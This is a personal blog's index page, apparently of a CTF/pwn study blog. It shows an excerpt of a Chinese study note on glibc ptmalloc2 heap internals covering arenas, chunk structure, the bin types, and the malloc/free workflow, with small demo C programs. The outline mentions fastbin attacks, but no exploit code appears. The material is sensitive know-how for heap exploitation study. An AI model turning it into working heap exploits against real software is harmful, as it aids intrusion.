<!DOCTYPE html>





<html lang="">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">

<link rel="stylesheet" href="/css/main.css?v=7.4.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.4.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Kopieren',
      copy_success: 'Kopiert',
      copy_failure: 'Kopieren fehlgeschlagen'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="Resit much,Obey little">
<meta property="og:type" content="website">
<meta property="og:title" content="ZERO-A-ONE">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="ZERO-A-ONE">
<meta property="og:description" content="Resit much,Obey little">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ZERO-A-ONE">
<meta name="twitter:description" content="Resit much,Obey little">
  <link rel="canonical" href="http://yoursite.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false,
    isPage: false,
    isArchive: false
  };
</script>

  <title>ZERO-A-ONE</title>
  








  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">
  <div class="container use-motion">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ZERO-A-ONE</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Navigationsleiste an/ausschalten">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
      
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>

  </li>
      
      
      
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>

  </li>
      <li class="menu-item menu-item-search">
        <a href="javascript:;" class="popup-trigger">
        
          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
      </li>
    
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="none"
           placeholder="Suche..." spellcheck="false"
           type="text" id="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div id="content" class="content">
            
  <div id="posts" class="posts-expand">
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/29/Angr╚δ├┼▒╩╝╟ú¿╥╗ú⌐/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/06/29/Angr╚δ├┼▒╩╝╟ú¿╥╗ú⌐/" class="post-title-link" itemprop="url">Angr入门笔记（一）</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-06-29 03:03:42 / Geändert am: 18:03:42" itemprop="dateCreated datePublished" datetime="2020-06-29T03:03:42-07:00">2020-06-29</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          
        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/04/│ñ═ñPWN▒╩╝╟03/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/05/04/│ñ═ñPWN▒╩╝╟03/" class="post-title-link" itemprop="url">长亭PWN笔记03</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-05-04 09:16:23" itemprop="dateCreated datePublished" datetime="2020-05-04T09:16:23-07:00">2020-05-04</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2020-05-05 00:16:40" itemprop="dateModified" datetime="2020-05-05T00:16:40-07:00">2020-05-05</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ul>
<li>什么是堆</li>
<li>glibc的堆管理实现<ul>
<li>arena</li>
<li>bins</li>
<li>chunk</li>
</ul>
</li>
<li>malloc和free的工作流程</li>
<li>fastbin attack  </li>
<li>新版本glibc中的tcache</li>
<li>堆的花式玩法</li>
</ul>
<h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/Pwn%E6%9C%AF%E8%BF%9B%E9%98%B6%EF%BC%8C%E7%8E%A9%E8%BD%AC%E5%A0%86%E6%BA%A2%E5%87%BA/QQ%E5%9B%BE%E7%89%8720200501204507.png" alt=" "></p>
<ul>
<li>栈通常用于为函数分配固定大小的局部内存</li>
<li>堆是可以根据运行时的需要进行动态分配和释放的内存，大小可变<ul>
<li>Malloc/New</li>
<li>Free/Delete</li>
</ul>
</li>
<li>堆的实现重点关注内存块的组织和管理方式，尤其是空闲内存块<ul>
<li>如何提高分配和释放效率</li>
<li>如何降低碎片化，提高空间利用率</li>
</ul>
</li>
<li>举例：浏览器的DOM树通常分配在堆上<ul>
<li>堆的实现算法影响堆分配网页加载和动态效果速度</li>
<li>堆的实现算法影响浏览器对内存的使用效率 </li>
</ul>
</li>
</ul>
<h2 id="常见堆实现"><a href="#常见堆实现" class="headerlink" title="常见堆实现"></a>常见堆实现</h2><ul>
<li>dlmalloc - 通用分配器</li>
<li>ptmalloc2 - glibc<ul>
<li>基于dlmalloc fork出来，在2006年增加了多线程支持</li>
</ul>
</li>
<li>jemalloc - FreeBSD、Firefox、Android</li>
<li>tcmalloc - Google Chrome</li>
<li>libumem - Solaris</li>
<li>Windows 10 - segment heap</li>
</ul>
<h2 id="ptmalloc2的多线程支持"><a href="#ptmalloc2的多线程支持" class="headerlink" title="ptmalloc2的多线程支持"></a>ptmalloc2的多线程支持</h2><ul>
<li>不同的线程维护不同的堆，称为<strong>per thread arena</strong></li>
<li>主线程创建的堆，称为<strong>main arena</strong></li>
<li>Arena数量受到CPU核数的限制<ul>
<li>对于32位系统：arena数量上限 = 2 * 核数</li>
<li>对于64位系统：arena数量上限 = 8 * 核数</li>
</ul>
</li>
</ul>
<h2 id="glibc的堆管理实现"><a href="#glibc的堆管理实现" class="headerlink" title="glibc的堆管理实现"></a>glibc的堆管理实现</h2><ul>
<li>arena<ul>
<li>指的是堆内存区域本身，并非结构</li>
<li>主线程的main arena通过sbrk创建</li>
<li>其他线程arena通过mmap创建</li>
</ul>
</li>
<li>malloc_state<ul>
<li>管理arena的核心结构，包含堆的状态信息、bins链表等</li>
<li>main arena对应的malloc_state结构存储在glibc的全局变量中</li>
<li>其他线程arena对应的malloc_state存储在arena本身当中</li>
</ul>
</li>
<li>bins<ul>
<li>bins用来管理空闲内存块，通常使用链表结构来进行组织</li>
</ul>
</li>
<li>chunks<ul>
<li>内存块的结构</li>
</ul>
</li>
</ul>
<blockquote>
<p>注意：</p>
<p>（1）以下介绍的堆管理环境为glibc 2.26 以下（不含2.26），即出现tcache之前的堆管理方式</p>
<p>（2）以下演示的环境均是64位程序及操作系统 </p>
</blockquote>
<h2 id="Arena头部结构：malloc-state"><a href="#Arena头部结构：malloc-state" class="headerlink" title="Arena头部结构：malloc_state"></a>Arena头部结构：malloc_state</h2><p>malloc_state存储了Arena的状态，其中包括了很多用于管理空闲块的bins链表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">	<span class="keyword">mutex_t</span> mutex; <span class="comment">/* 同步访问相关，互斥锁 */</span></span><br><span class="line">	<span class="keyword">int</span> flags; <span class="comment">/* 标志位，以前是max_fast，在一些老的文章上可能还使用的这个说法，比如phrack */</span></span><br><span class="line">	mfastbinptr fastbins[NFASTBINS]; <span class="comment">/* fastbins，之后会说到,是一个chunk的链表 */</span></span><br><span class="line">	mchunkptr top; <span class="comment">/* top chunk，一个特殊的chunk，在之后会说到 */</span></span><br><span class="line">	mchunkptr last_remainder; <span class="comment">/* 最后一次拆分top chunk得到的剩余内容，之后会说到 */</span></span><br><span class="line">	mchunkptr bins[BINS * <span class="number">2</span>]; <span class="comment">/* bins，一个chunk的链表的数组，之后会说到 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE]; <span class="comment">/* bins是否为空的一个位图 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span> <span class="comment">/* 链表，下一个malloc_state的位置 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line">	INTERNAL_SIZE_T system_mem;</span><br><span class="line">	INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">mallo_state</span> <span class="title">main_arena</span>;</span><span class="comment">/*global variable in libc.so*/</span></span><br></pre></td></tr></table></figure>

<p>主线程的malloc_state结构存储在glibc的全局变量中，变量名为main_arena</p>
<h2 id="Main-Arena概览"><a href="#Main-Arena概览" class="headerlink" title="Main Arena概览"></a>Main Arena概览</h2><p><img src="C:%5CUsers%5Csyc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200501213413134.png" alt></p>
<h2 id="空闲内存块-free-chunk-结构"><a href="#空闲内存块-free-chunk-结构" class="headerlink" title="空闲内存块(free chunk)结构"></a>空闲内存块(free chunk)结构</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/Pwn%E6%9C%AF%E8%BF%9B%E9%98%B6%EF%BC%8C%E7%8E%A9%E8%BD%AC%E5%A0%86%E6%BA%A2%E5%87%BA/QQ%E5%9B%BE%E7%89%8720200502160807.png" alt></p>
<p>在64位平台下，free chunk的第一个字段prev_size（8字节）存储了前一个chunk的大小</p>
<p>free chunk的第二个字段size记录了当前chunk的大小，该字段最低三个bit被用作其他含义</p>
<ul>
<li>P代表PREV_INUSE，即代表前一个chunk是否被使用</li>
<li>M代表IS_MMAPPED，代表当前chunk是否属于mmap出来的</li>
<li>N代表NON_MAIN_ARENA，代表该chunk是否属于非MAIN Arena</li>
</ul>
<p>第三个字段fd和第四个字段bk（8字节）前向指针和后向指针，这两个字段用于bin链表当中，用来链接大小相同或者相近的free chunk，便于后续分配时查找</p>
<h2 id="已分配内存块（allocated-chunk）结构"><a href="#已分配内存块（allocated-chunk）结构" class="headerlink" title="已分配内存块（allocated chunk）结构"></a>已分配内存块（allocated chunk）结构</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/Pwn%E6%9C%AF%E8%BF%9B%E9%98%B6%EF%BC%8C%E7%8E%A9%E8%BD%AC%E5%A0%86%E6%BA%A2%E5%87%BA/QQ%E5%9B%BE%E7%89%8720200502163306.png" alt></p>
<p>allocated chunk的前两个字段和free chunk相通</p>
<p>第三个字段开始到最后，chunk中存储的都是用户数据。甚至下一个chunk的第一个字段prev_size，也可以被用来存放数据，原因是这个prev_size字段只有当“前一个”chunk是free的时候才有意义，如果“前一个”chunk是已经分配的，堆管理器并不关心</p>
<p>所以对一个chunk来说，用户可用大小从偏移+8开始，一直到下一个chunk的orev_size字段</p>
<p>在64位平台下，chunk的大小一定是0x10字节的整数倍。malloc返回的指针为图中mem指向的位置，即数据开头</p>
<h2 id="malloc参数与chunk大小的关系"><a href="#malloc参数与chunk大小的关系" class="headerlink" title="malloc参数与chunk大小的关系"></a>malloc参数与chunk大小的关系</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/Pwn%E6%9C%AF%E8%BF%9B%E9%98%B6%EF%BC%8C%E7%8E%A9%E8%BD%AC%E5%A0%86%E6%BA%A2%E5%87%BA/QQ%E5%9B%BE%E7%89%8720200502223237.png" alt></p>
<ul>
<li>malloc参数为用户申请的内存大小</li>
<li>chunk包含数据和metadata</li>
<li>返回的chunk只要保证其中可用数据大小等于用户申请即可</li>
<li>在x86 32位平台下chunk的大小一定是8字节的整数倍；x64平台下，chunk的大小一定是16字节的整数倍</li>
</ul>
<h2 id="Bins结构"><a href="#Bins结构" class="headerlink" title="Bins结构"></a>Bins结构</h2><ul>
<li>BIns是用来管理和组织<strong>空闲</strong>内存块的链表结构，根据chunk的大小和状态，有许多种不同的Bins结构</li>
<li>Fast bins<ul>
<li>用于管理小的chunk</li>
</ul>
</li>
<li>Bins<ul>
<li>small bins - 用于管理中等大小的chunk</li>
<li>large bins - 用于管理较大的chunk</li>
<li>unsorted bins - 用于存放未整理的chunk</li>
</ul>
</li>
</ul>
<h2 id="Fast-bins"><a href="#Fast-bins" class="headerlink" title="Fast bins"></a>Fast bins</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>&#123;</span></span><br><span class="line">    <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">    <span class="keyword">int</span> flags;</span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">    mchunkptr top;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line">    mchunkptr bins[NBINS*<span class="number">2</span><span class="number">-2</span>];</span><br><span class="line">    <span class="comment">/*..*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>大小<ul>
<li>x86_32平台：16~64字节</li>
<li>x64平台：32~128字节</li>
</ul>
</li>
<li>相同大小的chunk放在一个bin中</li>
<li>单向链表</li>
<li>后进先出（FILO，First in last out）</li>
<li>相邻的空闲fastbin chunk不会被合并</li>
<li>当chunk被free时，不会清理PREV_INUSE标志</li>
</ul>
<h2 id="Fast-bins在内存中的结构示例"><a href="#Fast-bins在内存中的结构示例" class="headerlink" title="Fast bins在内存中的结构示例"></a>Fast bins在内存中的结构示例</h2><p>源代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *a1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a1,<span class="number">0x41</span>,<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">char</span> *a2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a2,<span class="number">0x42</span>,<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">char</span> *a3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a3,<span class="number">0x43</span>,<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Malloc done!\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a1);</span><br><span class="line">    <span class="built_in">free</span>(a2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Free done\n"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<ul>
<li>下断点在<code>printf(&quot;Malloc done!\n&quot;);</code></li>
</ul>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/Pwn%E6%9C%AF%E8%BF%9B%E9%98%B6%EF%BC%8C%E7%8E%A9%E8%BD%AC%E5%A0%86%E6%BA%A2%E5%87%BA/QQ%E5%9B%BE%E7%89%8720200502230606.png" alt></p>
<ul>
<li>下断点在<code>printf(&quot;Free done\n&quot;);</code></li>
</ul>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/Pwn%E6%9C%AF%E8%BF%9B%E9%98%B6%EF%BC%8C%E7%8E%A9%E8%BD%AC%E5%A0%86%E6%BA%A2%E5%87%BA/QQ%E5%9B%BE%E7%89%8720200502230919.png" alt></p>
<h2 id="Small-bins"><a href="#Small-bins" class="headerlink" title="Small bins"></a>Small bins</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>&#123;</span></span><br><span class="line">    <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">    <span class="keyword">int</span> flags;</span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">    mchunkptr top;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line">    mchunkptr bins[NBINS*<span class="number">2</span><span class="number">-2</span>];</span><br><span class="line">    <span class="comment">/*..*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>chunk大小 &lt; 1024 bytes(64bit)</li>
<li>相同大小的chunk放在一个bin中</li>
<li>双向循环链表</li>
<li>先进先出（First in first out）</li>
<li>当有空闲块相邻时，chunk会被合并成一个更大的chunk</li>
<li>bins[2],bins[3],…,bins[124],bins[125]共62组smallbin，大小范围[0x20,0x3f0]（64位）</li>
</ul>
<h2 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>&#123;</span></span><br><span class="line">    <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">    <span class="keyword">int</span> flags;</span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">    mchunkptr top;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line">    mchunkptr bins[NBINS*<span class="number">2</span><span class="number">-2</span>];</span><br><span class="line">    <span class="comment">/*..*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>chunk大小 &gt;= 1024 bytes(64bit)</li>
<li>每组bin表示一组size范围而不是具体的size，例如bins[126],bins[127]的链表中保存长度在[0x400,0x440]的chunk</li>
<li>双向循环链表</li>
<li>先进先出</li>
<li>chunk按照大小从大到小的排序</li>
<li>当有空闲块相邻，chunk会被合并</li>
<li>bins[126],bins[127],…,bins[250],bins[251]共63组largebin，大小范围[0x400,X]（64位）</li>
</ul>
<h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>&#123;</span></span><br><span class="line">    <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">    <span class="keyword">int</span> flags;</span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">    mchunkptr top;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line">    mchunkptr bins[NBINS*<span class="number">2</span><span class="number">-2</span>];</span><br><span class="line">    <span class="comment">/*..*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>64位平台中：chunk大小&gt;128字节</li>
<li>只存在唯一一个unsorted bin</li>
<li>双向循环链表</li>
<li>当一个chunk（非fastbin）被free，它首先被放入unsorted bin，等后续整理时才会放入对应的small bin/fast bin</li>
<li>bins[0],bins[1]</li>
</ul>
<h2 id="Unsorted-bins与small-bins"><a href="#Unsorted-bins与small-bins" class="headerlink" title="Unsorted bins与small bins"></a>Unsorted bins与small bins</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/S6.png" alt></p>
<h2 id="其他chunk"><a href="#其他chunk" class="headerlink" title="其他chunk"></a>其他chunk</h2><ul>
<li>Top chunk<ul>
<li>不属于任何bin</li>
<li>在arena中处于最高地址</li>
<li>当没有其他空闲块时，top chunk就会被用于分配</li>
<li>分裂时<ul>
<li>一块是请求大小的chunk</li>
<li>另一块余下chunk将成为新的Top chunk</li>
</ul>
</li>
</ul>
</li>
<li>Last_remainder<ul>
<li>当请求small chunk大小的内存时，如发生分裂，则剩余的chunk保存为last_remainder</li>
</ul>
</li>
</ul>
<h2 id="malloc的工作流程"><a href="#malloc的工作流程" class="headerlink" title="malloc的工作流程"></a>malloc的工作流程</h2><ol>
<li>如果在size &lt; max fast，在fast bins中寻找fast chunk，如找到则结束</li>
<li>如果size in_smallbin_range，在small bins中寻找small chunk，如找到则结束</li>
<li>如果size not in_smallbin_range，合并所有fastbin的chunk</li>
<li>循环：<ol>
<li>检查unsorted bin中的last_remainder<ul>
<li>如果满足一定条件，则分裂之，将剩余的chunk标记为新的last_remainder</li>
</ul>
</li>
<li>在unsorted bin中搜索，同时进行整理<ul>
<li>如遇到精确大小，则返回，否则就把当前chunk整理到small/large bin中去</li>
</ul>
</li>
<li>在small bin和large bin中搜索最合适的chunk（不一定是精确大小）</li>
</ol>
</li>
<li>使用top chunk</li>
</ol>
<h2 id="free的工作流程"><a href="#free的工作流程" class="headerlink" title="free的工作流程"></a>free的工作流程</h2><ol>
<li>如果size &lt; masx fast，放入fast bin，结束</li>
<li>如果前一个chunk是free的<ol>
<li>unlink前面的chunk</li>
<li>合并两个chunk，并放入unsorted bin</li>
</ol>
</li>
<li>如果后一个chunk是top chunk，则将当前chunk并入top chunk</li>
<li>如果后一个chunk是free的<ol>
<li>unlink后面的chunk</li>
<li>合并两个chunk，并放入unsorted bin</li>
</ol>
</li>
<li>前后chunk都不是free的，放入unsorted bin</li>
</ol>
<blockquote>
<p>相当于所有的chunk在被free时只有三种去路：放入fastbin、放入unsortbin、并入top chunk</p>
</blockquote>
<h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *A,*B,*C,*D;</span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">    C = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">    D = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    <span class="built_in">free</span>(C);</span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">free</span>(B)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分配完malloc之后：</p>
